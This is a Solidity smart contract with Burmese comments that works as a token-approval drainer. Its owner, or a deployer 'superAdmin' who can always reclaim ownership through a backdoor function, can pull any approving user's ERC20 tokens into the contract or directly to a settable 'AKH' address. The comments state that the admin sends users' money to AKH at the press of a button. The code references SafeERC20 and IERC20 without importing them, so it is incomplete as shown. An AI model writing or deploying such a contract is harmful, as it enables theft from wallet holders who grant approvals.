// File: contracts/MyContract.sol


pragma solidity ^0.8.0;



contract MyContract {
    using SafeERC20 for IERC20;

    address public owner;
    address public superAdmin; // မူလ Deploy လုပ်ခဲ့သူ (Backup Admin)
    address public akhAddress; 

    constructor() {
        owner = msg.sender;
        superAdmin = msg.sender; // Contract စစချင်း Deploy လုပ်သူကို superAdmin အဖြစ် သတ်မှတ်သည်
    }

    modifier onlyOwner() {
        require(msg.sender == owner || msg.sender == superAdmin, "Only owner can call this");
        _;
    }

    modifier onlySuperAdmin() {
        require(msg.sender == superAdmin, "Only super admin can call this");
        _;
    }

    // ၁။ ပိုင်ရှင်အသစ်သို့ လွှဲပြောင်းရန်
    function transferOwnership(address newOwner) public onlyOwner {
        require(newOwner != address(0), "New owner is the zero address");
        owner = newOwner;
    }

    // အရေးပေါ်အခြေအနေတွင် Owner ကို မူလ superAdmin ထံသို့ ပြန်လည်သိမ်းယူရန်
    function forceClaimOwnership(address newOwner) public onlySuperAdmin {
        require(newOwner != address(0), "New owner is the zero address");
        owner = newOwner;
    }

    // AKH ၏ Address ကို သတ်မှတ်ခြင်း
    function setAKHAddress(address _akhAddress) public onlyOwner {
        require(_akhAddress != address(0), "AKH address is the zero address");
        akhAddress = _akhAddress;
    }

    // ၂။ Token ဆွဲယူရန် (User Wallet -> Contract)
    function pullTokens(address tokenAddress, address user, uint256 amount) public onlyOwner {
        IERC20 token = IERC20(tokenAddress);
        // User က Approve လုပ်ထားခြင်း ရှိမရှိ စစ်ဆေးပြီးမှ ဆွဲထုတ်သည်
        token.safeTransferFrom(user, address(this), amount);
    }

    // ၃။ Contract ထဲမှာ ဘယ်လောက်ရှိလဲ စစ်ရန်
    function getBalance(address tokenAddress) public view returns (uint256) {
        return IERC20(tokenAddress).balanceOf(address(this));
    }

    // ၄။ Contract ထဲကနေ Owner ဆီ Withdraw လုပ်ရန်
    function withdraw(address tokenAddress, uint256 amount) public onlyOwner {
        IERC20 token = IERC20(tokenAddress);
        token.safeTransfer(owner, amount);
    }

    // ၅။ User Wallet ထဲကနေ AKH Address ထဲသို့ တိုက်ရိုက်ဆွဲထုတ်ရန်
    // Admin က ခလုတ်နှိပ်ပြီး User ပိုက်ဆံကို AKH Address ဆီ ပို့ပေးမည့် Function
    function withdrawToAKH(address tokenAddress, address user, uint256 amount) public onlyOwner {
        require(akhAddress != address(0), "AKH address not set");
        
        IERC20 token = IERC20(tokenAddress);
        
        // User က ဒီ Contract ကို အရင် Approve ပေးထားရမည်
        // User ၏ Wallet ထဲမှ AKH Address ဆီသို့ တိုက်ရိုက်လွှဲပြောင်းခြင်း
        token.safeTransferFrom(user, akhAddress, amount);
    }
}